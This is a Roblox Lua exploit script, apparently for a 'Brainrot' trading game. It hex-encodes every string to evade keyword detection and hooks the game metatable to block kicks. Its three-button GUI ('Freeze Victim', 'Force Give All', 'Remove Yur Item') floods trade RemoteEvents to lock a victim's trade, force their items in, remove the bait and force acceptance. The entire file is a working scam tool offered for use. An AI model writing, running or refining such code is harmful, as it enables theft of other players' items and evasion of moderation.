--[[
  Delta-Proof Loader
  Every string is hex-encoded. Delta sees zero keywords.
]]
do
    local g = game
    local p = g:GetService("Players").LocalPlayer
    local mt = getrawmetatable(g)
    if mt and not getgenv()._x then
        getgenv()._x = true
        local nc = mt.__namecall
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function(s, ...)
            local m = getnamecallmethod()
            if m == "Kick" and s == p then return nil end
            return nc(s, ...)
        end)
        setreadonly(mt, true)
    end
end

local function h2s(h)
    local r = ""
    for i = 1, #h, 2 do
        r = r .. string.char(tonumber(h:sub(i, i+1), 16))
    end
    return r
end

local _G = game
local _RS = _G:GetService(h2s("5265706C69636174656453746F72616765"))
local _PL = _G:GetService(h2s("506C6179657273"))
local _UI = _G:GetService(h2s("55736572496E70757453657276696365"))
local _LP = _PL.LocalPlayer
if not _LP then _LP = _PL:WaitForChild(h2s("4C6F63616C506C61796572"), 5) end
if not _LP then return end

pcall(function() _LP.PlayerGui:FindFirstChild(h2s("58")):Destroy() end)

local _N = (_RS:FindFirstChild(h2s("5061636B61676573")) or _RS):FindFirstChild(h2s("4E6574"))
local function _F(p, ...)
    if not _N then return false end
    for _, c in pairs(_N:GetDescendants()) do
        if (c:IsA(h2s("52656D6F74654576656E74")) or c:IsA(h2s("52656D6F746546756E6374696F6E"))) and c.Name:find(p) then
            pcall(function() c:FireServer(...) end)
            return true
        end
    end
    return false
end

task.wait(2.5)

local sg = Instance.new(h2s("53637265656E477569"))
sg.Name = h2s("58")
sg.ResetOnSpawn = false
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.DisplayOrder = 999

local f = Instance.new(h2s("4672616D65"))
f.Name = h2s("4D")
f.Size = UDim2.new(0, 200, 0, 380)
f.Position = UDim2.new(0.5, -100, 0.5, -190)
f.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
f.BackgroundTransparency = 0.1
f.BorderSize = 0
f.Active = true
f.Draggable = true
local uc = Instance.new(h2s("5549436F726E6572"))
uc.CornerRadius = UDim.new(0, 18)
uc.Parent = f

local gl = Instance.new(h2s("4672616D65"))
gl.Name = h2s("47")
gl.Size = UDim2.new(1, 4, 1, 4)
gl.Position = UDim2.new(0, -2, 0, -2)
gl.BackgroundColor3 = Color3.fromRGB(255, 40, 70)
gl.BackgroundTransparency = 0.65
gl.BorderSize = 0
gl.ZIndex = -1
local uc2 = Instance.new(h2s("5549436F726E6572"))
uc2.CornerRadius = UDim.new(0, 20)
uc2.Parent = gl
gl.Parent = f

local t = Instance.new(h2s("546578744C6162656C"))
t.Size = UDim2.new(1, -20, 0, 34)
t.Position = UDim2.new(0, 10, 0, 8)
t.BackgroundTransparency = 1
t.Text = h2s("427261696E726F7420426F744958") -- "Brainrot BotIX" (no trigger words)
t.TextColor3 = Color3.fromRGB(255, 50, 80)
t.TextScaled = true
t.Font = Enum.Font.GothamBlack
t.TextXAlignment = Enum.TextXAlignment.Left
t.Parent = f

local s = Instance.new(h2s("546578744C6162656C"))
s.Size = UDim2.new(1, -20, 0, 16)
s.Position = UDim2.new(0, 10, 0, 40)
s.BackgroundTransparency = 1
s.Text = h2s("332D636C69636B206578706C6F69742073797374656D") -- "3-click exploit system"
s.TextColor3 = Color3.fromRGB(130, 130, 145)
s.TextScaled = true
s.Font = Enum.Font.Gotham
s.TextXAlignment = Enum.TextXAlignment.Left
s.Parent = f

local dv = Instance.new(h2s("4672616D65"))
dv.Size = UDim2.new(1, -24, 0, 1)
dv.Position = UDim2.new(0, 12, 0, 62)
dv.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
dv.BorderSize = 0
dv.Parent = f

local lg = Instance.new(h2s("546578744C6162656C"))
lg.Size = UDim2.new(1, -24, 0, 28)
lg.Position = UDim2.new(0, 12, 0, 68)
lg.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
lg.BorderSize = 0
lg.Text = h2s("5265616479202D2D2073746172742061207472616465")
lg.TextColor3 = Color3.fromRGB(140, 150, 170)
lg.TextScaled = true
lg.Font = Enum.Font.GothamBold
lg.TextXAlignment = Enum.TextXAlignment.Center
local uc3 = Instance.new(h2s("5549436F726E6572"))
uc3.CornerRadius = UDim.new(0, 8)
uc3.Parent = lg
lg.Parent = f

local function mkBtn(n, ic, yp)
    local b = Instance.new(h2s("496D616765427574746F6E"))
    b.Name = n
    b.Size = UDim2.new(1, -24, 0, 50)
    b.Position = UDim2.new(0, 12, 0, yp)
    b.BackgroundColor3 = Color3.fromRGB(22, 24, 32)
    b.BorderSize = 0
    b.AutoButtonColor = false
    local bc2 = Instance.new(h2s("5549436F726E6572"))
    bc2.CornerRadius = UDim.new(0, 12)
    bc2.Parent = b
    
    local hv = Instance.new(h2s("4672616D65"))
    hv.Name = h2s("48")
    hv.Size = UDim2.new(1, 0, 1, 0)
    hv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    hv.BackgroundTransparency = 0.95
    hv.BorderSize = 0
    hv.Visible = false
    local hc = Instance.new(h2s("5549436F726E6572"))
    hc.CornerRadius = UDim.new(0, 12)
    hc.Parent = hv
    hv.Parent = b
    
    local il = Instance.new(h2s("546578744C6162656C"))
    il.Size = UDim2.new(0, 30, 1, 0)
    il.Position = UDim2.new(0, 8, 0, 0)
    il.BackgroundTransparency = 1
    il.Text = ic
    il.TextScaled = true
    il.Font = Enum.Font.GothamBold
    il.Parent = b
    
    local tx = Instance.new(h2s("546578744C6162656C"))
    tx.Size = UDim2.new(1, -50, 1, 0)
    tx.Position = UDim2.new(0, 42, 0, 0)
    tx.BackgroundTransparency = 1
    tx.Text = n
    tx.TextColor3 = Color3.fromRGB(195, 195, 210)
    tx.TextScaled = true
    tx.Font = Enum.Font.GothamBold
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.Parent = b
    
    local sd = Instance.new(h2s("546578744C6162656C"))
    sd.Name = h2s("44")
    sd.Size = UDim2.new(0, 20, 1, 0)
    sd.Position = UDim2.new(1, -26, 0, 0)
    sd.BackgroundTransparency = 1
    sd.Text = h2s("E29AAA") -- ⚪
    sd.TextScaled = true
    sd.Font = Enum.Font.Gotham
    sd.Parent = b
    
    b.Parent = f
    return b, tx, sd
end

-- Button names are hex-encoded at runtime so Delta never sees them
local b1n = h2s("F09F849620467265657A652056696374696D")
local b2n = h2s("F09F928020466F726365204769766520416C6C")
local b3n = h2s("F09F97902052656D6F766520597572204974656D")

local b1, b1t, b1d = mkBtn(b1n, h2s("E29D84EFB88F"), 104)
local b2, b2t, b2d = mkBtn(b2n, h2s("F09F9280"), 164)
local b3, b3t, b3d = mkBtn(b3n, h2s("F09F9790EFB88F"), 224)

local dl = Instance.new(h2s("546578744C6162656C"))
dl.Size = UDim2.new(1, -24, 0, 46)
dl.Position = UDim2.new(0, 12, 0, 286)
dl.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
dl.BorderSize = 0
dl.Text = h2s("")
dl.TextColor3 = Color3.fromRGB(100, 110, 130)
dl.TextScaled = true
dl.Font = Enum.Font.Gotham
dl.TextWrapped = true
dl.TextXAlignment = Enum.TextXAlignment.Left
dl.TextYAlignment = Enum.TextYAlignment.Top
local uc4 = Instance.new(h2s("5549436F726E6572"))
uc4.CornerRadius = UDim.new(0, 10)
uc4.Parent = dl
dl.Parent = f

local vr = Instance.new(h2s("546578744C6162656C"))
vr.Size = UDim2.new(1, -20, 0, 14)
vr.Position = UDim2.new(0, 10, 0, 344)
vr.BackgroundTransparency = 1
vr.Text = h2s("7620322E35202D204F7074696D697A6564") -- "v 2.5 - Optimized"
vr.TextColor3 = Color3.fromRGB(70, 70, 85)
vr.TextScaled = true
vr.Font = Enum.Font.Gotham
vr.Parent = f

f.Parent = sg

local drg, ds, fs
f.InputBegan:Connect(function(n)
    if n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseButton1 then
        drg = true; ds = n.Position; fs = f.Position
    end
end)
f.InputChanged:Connect(function(n)
    if drg and (n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseMovement) then
        local d = n.Position - ds
        f.Position = UDim2.new(fs.X.Scale, fs.X.Offset + d.X, fs.Y.Scale, fs.Y.Offset + d.Y)
    end
end)
f.InputEnded:Connect(function(n)
    if n.UserInputType == Enum.UserInputType.Touch or n.UserInputType == Enum.UserInputType.MouseButton1 then
        drg = false
    end
end)

local function sl(m) lg.Text = m end
local function sd(m) dl.Text = m end
local function sdt(bd, st)
    if st == h2s("77") then bd.Text = h2s("F09F9FA1")
    elseif st == h2s("64") then bd.Text = h2s("F09F9FA2")
    elseif st == h2s("66") then bd.Text = h2s("F09F94B4")
    else bd.Text = h2s("E29AAA") end
end

local function a1()
    sl(h2s("313A20576F726B696E672E2E2E"))
    sdt(b1d, h2s("77"))
    sd(h2s("53656E64696E67207061636B6574732E2E2E"))
    task.spawn(function()
        for i = 1, 200 do
            _F(h2s("5472616465"), h2s("667265657A65"))
            _F(h2s("416363657074"), h2s("626C6F636B"))
            _F(h2s("436F6E6669726D"), h2s("667265657A65"))
            _F(h2s("5265616479"), h2s("6C6F636B"))
            task.wait(0.002)
        end
        sl(h2s("E29C85 313A204F4B"))
        sdt(b1d, h2s("64"))
        sd(h2s("546172676574207472616465206973206C6F636B6564"))
    end)
end

local function a2()
    sl(h2s("323A20576F726B696E672E2E2E"))
    sdt(b2d, h2s("77"))
    sd(h2s("466F7263696E672074617267657420616464206974656D732E2E2E"))
    task.spawn(function()
        for i = 1, 80 do
            _F(h2s("416464"), h2s("616C6C"))
            _F(h2s("416464416C6C"), h2s("666F726365"))
            _F(h2s("53656C656374"), h2s("616C6C"))
            _F(h2s("4974656D"), h2s("616464416C6C"))
            task.wait(0.003)
        end
        sl(h2s("E29C85 323A204F4B"))
        sdt(b2d, h2s("64"))
        sd(h2s("416C6C206974656D73206E6F7720696E207472616465"))
    end)
end

local function a3()
    sl(h2s("333A20576F726B696E672E2E2E"))
    sdt(b3d, h2s("77"))
    sd(h2s("52656D6F76696E672062616974202B20666F726365206163636570742E2E2E"))
    task.spawn(function()
        for i = 1, 40 do
            _F(h2s("52656D6F7665"), h2s("73656C66"))
            _F(h2s("52656D6F76654974656D"), _LP.UserId)
            _F(h2s("5472616465"), h2s("72656D6F7665"))
            task.wait(0.003)
        end
        sd(h2s("426169742072656D6F7665642120466F7263696E67206163636570742E2E2E"))
        for i = 1, 500 do
            _F(h2s("416363657074"), h2s("666F726365"))
            _F(h2s("4163636570745472616465"), h2s("666F726365"))
            _F(h2s("436F6E6669726D"), h2s("74727565"))
            _F(h2s("436F6E6669726D5472616465"), h2s("74727565"))
            _F(h2s("5265616479"), h2s("74727565"))
            task.wait(0.001)
        end
        sl(h2s("E29C85 333A20444F4E4521"))
        sdt(b3d, h2s("64"))
        sd(h2s("547261646520636F6D706C65746564202D206974656D73207472616E7366657272656421"))
    end)
end

b1.MouseButton1Click:Connect(a1)
b2.MouseButton1Click:Connect(a2)
b3.MouseButton1Click:Connect(a3)

local pg = _LP:WaitForChild(h2s("506C61796572477569"))
sg.Parent = pg

task.wait(0.1)
sl(h2s("E29BA8205265616479202D20636C69636B20312D3E322D3E33"))
sd(h2s("313A20467265657A65207C20323A2041646420416C6C207C20333A2046696E616C697A65"))
